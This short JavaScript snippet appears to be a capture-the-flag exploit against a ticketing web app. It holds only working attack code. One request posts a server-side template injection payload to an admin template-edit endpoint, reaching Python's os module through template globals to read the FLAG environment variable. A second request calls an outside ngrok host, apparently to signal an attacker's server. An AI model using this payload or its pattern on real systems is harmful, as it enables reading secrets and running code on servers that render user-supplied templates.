fetch("/admin/templates/1/edit", {
  method: "POST",
  body: "name=Default+Ticket+Template&html_content=" +
    encodeURIComponent("testaa<h1>{{ event_name }}</h1><p>{{ buyer_name }}</p><p>{{ ticket_code }} {{ self.__init__.__globals__.__builtins__.__import__('os').environ['FLAG'] }}bagrxyz</p>") +
    "&is_default=on",
  headers: {
    "content-type": "application/x-www-form-urlencoded"
  }
})

fetch("https://eaf3-195-113-197-234.ngrok-free.app/botping")
